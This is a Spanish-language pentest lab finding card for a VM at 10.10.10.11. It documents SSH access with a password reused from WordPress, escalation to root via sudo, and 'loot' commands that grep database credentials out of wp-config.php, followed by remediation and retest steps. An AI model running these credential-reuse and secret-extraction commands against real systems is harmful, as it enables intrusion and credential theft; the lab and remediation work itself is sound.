# M1-SSH · Clave reutilizada + sudo

## 1. Ficha

| Campo | Valor |
|---|---|
| VM | M1 `10.10.10.11` |
| Servicio | OpenSSH |
| Credenciales | `ubuntu` / `Admin13.-` |
| CWE | CWE-521 + CWE-269 |
| CVSS | ~8.8 ambiental |
| Estado | **Validada** (`uid=0(root)`) |

## 2. Precondiciones

- SSH abierto en M1.
- `ubuntu` en el grupo `sudo`.
- Misma clave que WordPress.

## 3. Flujo

1. Snapshot M1: `previo-a-SSH`.
2. Acceso:

```bash
sshpass -p 'Admin13.-' ssh -o StrictHostKeyChecking=no ubuntu@10.10.10.11 \
  'id; hostname; ip -brief a'
```

3. Escalada:

```bash
sshpass -p 'Admin13.-' ssh ubuntu@10.10.10.11 \
  'echo Admin13.- | sudo -S id'
```

4. Loot:

```bash
sshpass -p 'Admin13.-' ssh ubuntu@10.10.10.11 \
  "echo Admin13.- | sudo -S grep -E 'DB_NAME|DB_USER|DB_PASSWORD|DB_HOST' /var/www/wp/wp-config.php"
```

## 4. Resultado esperado

```text
uid=1000(ubuntu) ... groups=...,27(sudo),...
uid=0(root) gid=0(root) groups=0(root)
define( 'DB_PASSWORD', 'wp_pass123' );
```

## 5. Evidencia

- `EV-M1-SSH-01`: `id` y hostname.
- `EV-M1-SSH-02`: `sudo id` root.
- `EV-M1-SSH-03`: `wp-config.php`.
- `LOG-M1-SSH`.

## 6. Impacto y siguiente salto

- **Root en M1**.
- Pivote total a M2–M5.
- Credenciales de la base de datos.

## 7. Fallback

- Si SSH está cerrado, usar W1/W4 para el shell `www-data` y el túnel.

## 8. Remediación

- Clave única para `ubuntu`.
- `PermitRootLogin no`.
- `sudoers` restringido; 2FA.
- No reutilizar la clave de WordPress.

## 9. Retest

```bash
sshpass -p 'Admin13.-' ssh ubuntu@10.10.10.11 'id'   # debe fallar
sshpass -p '<nueva>' ssh ubuntu@10.10.10.11 'sudo id' # no debe ser root
```

## 10. EARS

- **REQ-M1SSH-01 (Evento).** CUANDO se valide M1-SSH, el laboratorio DEBE capturar `uid=0(root)`.
- **REQ-M1SSH-02 (Ubicuo).** La remediación DEBE invalidar la clave vieja y restringir sudo.

## 11. Checklist

- [ ] Snapshot `previo-a-SSH`.
- [ ] SSH con clave vieja.
- [ ] `sudo id` root.
- [ ] `wp-config.php`.
- [ ] Remediación.
- [ ] Retest.
